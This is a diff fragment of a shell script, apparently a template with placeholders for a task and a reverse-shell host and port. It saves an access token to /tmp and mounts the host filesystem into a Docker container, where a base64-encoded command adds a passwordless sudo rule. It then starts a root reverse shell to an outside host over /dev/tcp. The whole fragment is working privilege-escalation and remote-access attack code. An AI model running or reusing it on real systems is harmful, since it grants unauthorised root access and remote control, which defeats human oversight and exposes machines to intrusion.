@@ -303,9 +303,9 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
 while ! command -v docker; do "echo waiting for docker..."; sleep 30; done
 CURRENT_USER=$(whoami)
 echo "current user: $CURRENT_USER"
-COMMAND="bash -c 'echo \"$CURRENT_USER ALL=(ALL) NOPASSWD:ALL\" > /host/etc/sudoers.d/custom-sudoers'"
+COMMAND="bash -c 'echo \\"$CURRENT_USER ALL=(ALL) NOPASSWD:ALL\\" > /host/etc/sudoers.d/custom-sudoers'"
 PAYLOAD=$(echo -n $COMMAND | base64 -w0)
-docker run -it -v /:/host/ ubuntu:latest /bin/bash -c "echo $PAYLOAD | base64 -d | /bin/bash"
+docker run --rm -it -v /:/host/ ubuntu:latest /bin/bash -c "echo $PAYLOAD | base64 -d | /bin/bash"
 echo "new user: $(sudo whoami)"
 echo "starting escalated reverse shell..."
 nohup /bin/sh -c 'sudo /bin/bash -c "TASK={task} /bin/bash -i >& /dev/tcp/{reverse_shell_host}/{reverse_shell_port} 0>&1"' >/dev/null 2>&1 &
